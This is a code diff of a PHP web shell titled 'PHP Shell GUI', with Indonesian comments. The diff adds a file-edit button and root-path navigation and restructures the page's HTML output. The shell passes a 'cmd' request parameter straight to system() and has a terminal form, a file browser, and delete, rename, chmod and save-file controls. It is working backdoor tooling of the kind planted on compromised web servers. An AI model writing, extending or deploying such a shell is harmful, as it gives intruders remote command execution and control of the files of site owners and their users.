@@ -85,13 +85,12 @@ if (isset($_GET['cmd'])) {
     system($_GET['cmd']);
     $output = ob_get_clean();
 }
-
-echo <<<HTML
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>🌐 PHP Shell GUI - Panel Kanan Vertikal</title>
+<title>🌐 PHP Shell GUI with Back & Top Panel</title>
 <style>
     body {
         background: #1e1e2f; color: #cfd2dc; font-family: monospace; margin:0; padding: 20px;
@@ -125,14 +124,9 @@ echo <<<HTML
         padding: 10px;
         border-radius: 8px;
     }
-    input, select, textarea {
+    input, select {
         padding: 4px; background: #111; color: #0f0; border: 1px solid #555; margin: 2px;
         font-family: monospace;
-    }
-    textarea {
-        width: 100%;
-        height: 300px;
-        resize: vertical;
     }
     input[type=submit], button.mini-btn {
         background: #333; color: white; cursor: pointer; border: none;
@@ -168,7 +162,8 @@ echo <<<HTML
     #back-button {
         margin-bottom: 10px;
     }
-    /* Hover highlight untuk baris file/folder */
+
+    /* Tambahan hover highlight baris */
     .flex-row:hover {
         background-color: #3a3f6b;
         cursor: pointer;
@@ -206,10 +201,11 @@ echo <<<HTML
 
 <div class="container">
     <div id="file-list">
-HTML;
-
-// Breadcrumb path
+<?php
+// Breadcrumb path dengan root /
 echo "<div class='path'><b>📁 Path:</b> ";
+echo "<a href='?path=" . urlencode(DIRECTORY_SEPARATOR) . "'>/</a> / ";
+
 $parts = explode(DIRECTORY_SEPARATOR, $path);
 $nav = "";
 foreach ($parts as $p) {
@@ -275,6 +271,8 @@ foreach ($all as $file) {
                 <button type='submit' class='mini-btn' title='Change Permission'>🔒</button>
               </form>";
 
+    $edit = is_file($full) ? "<a class='mini-btn' href='?path=" . urlencode($path) . "&edit=" . urlencode($file) . "' title='Edit File'>✍️</a>" : "";
+
     echo "<div class='flex-row'>
         <div class='col-name'>$link</div>
         <div class='col-size'>$size</div>
@@ -282,37 +280,32 @@ foreach ($all as $file) {
         <div class='col-group'>$group</div>
         <div class='col-perm'>$perm</div>
         <div class='col-time'>$time</div>
-        <div class='col-action'>$del $ren $chmod</div>
+        <div class='col-action'>$del $ren $chmod $edit</div>
     </div>";
 }
 echo "</div>";
 
-// File viewer
+// File viewer atau editor
 if (isset($_GET['view'])) {
     $viewFile = $path . DIRECTORY_SEPARATOR . $_GET['view'];
     if (is_file($viewFile)) {
         $content = htmlspecialchars(file_get_contents($viewFile));
         echo "<div class='box'><b>📄 Isi file:</b> " . htmlspecialchars($_GET['view']) . "<pre>$content</pre></div>";
     }
-}
-
-// File editor
-if (isset($_GET['edit'])) {
+} elseif (isset($_GET['edit'])) {
     $editFile = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
     if (is_file($editFile)) {
         $content = htmlspecialchars(file_get_contents($editFile));
-        echo "<div class='box'>
-            <b>✍️ Edit file:</b> " . htmlspecialchars($_GET['edit']) . "
+        echo "<div class='box'><b>✍️ Edit file:</b> " . htmlspecialchars($_GET['edit']) . "
             <form method='POST'>
                 <input type='hidden' name='filename' value='" . htmlspecialchars($_GET['edit']) . "'>
-                <textarea name='save_file'>$content</textarea><br>
+                <textarea name='save_file' style='width:100%; height:300px; background:#111; color:#0f0; border:1px solid #555; font-family: monospace;'>$content</textarea><br>
                 <input type='submit' value='Simpan Perubahan'>
             </form>
         </div>";
     }
 }
-
-echo <<<HTML
+?>
     </div> <!-- end file-list -->
 
     <div id="side-panel">
@@ -334,21 +327,18 @@ echo <<<HTML
         <div id="terminal">
             <h3>💻 Terminal</h3>
             <form method="GET">
-                <input type="hidden" name="path" value="{$path}">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                 <input type="text" name="cmd" placeholder="Perintah shell..." style="width:90%;">
                 <input type="submit" value="Run">
             </form>
-HTML;
-
+<?php
 if ($output) {
     echo "<pre>" . htmlspecialchars($output) . "</pre>";
 }
-
-echo <<<HTML
+?>
         </div>
     </div> <!-- end side-panel -->
 </div> <!-- end container -->
+
 </body>
 </html>
-HTML;
-?>
